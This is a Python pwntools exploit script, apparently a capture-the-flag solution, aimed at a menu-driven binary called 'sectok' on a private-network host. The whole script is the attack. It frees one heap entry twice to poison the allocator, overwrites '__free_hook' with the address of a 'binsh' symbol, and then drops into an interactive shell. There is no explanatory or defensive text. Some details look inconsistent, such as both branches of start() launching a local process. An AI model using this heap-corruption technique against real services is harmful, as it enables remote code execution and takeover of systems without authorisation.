#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './sectok')

host = args.HOST or '10.21.232.3'
port = int(args.PORT or 10101)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return process([exe.path] + argv,*a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

def remove(user: int):
    p.sendline(b'd')
    p.sendline(str(user).encode())

def add(name : bytes):
    p.sendline(b'g\n'+name)
    

def quit():
    p.sendline(b'x')

write_addr = exe.symbols['__free_hook']

bin_sh = exe.symbols['binsh']
done = "x\n"


p = remote('10.21.232.3',10101)

p.sendline(b'v')

for i in range(9):
    add(b'abc')

for i in range(7):
    remove(i)

remove(7)

remove(8)

remove(7)


for i in range(7):
    add(b'abc')
    

add(pack(write_addr))
add(b'abc')
add(b'abc')
add(pack(bin_sh))
remove(0)
p.sendline(b'x')

p.interactive()

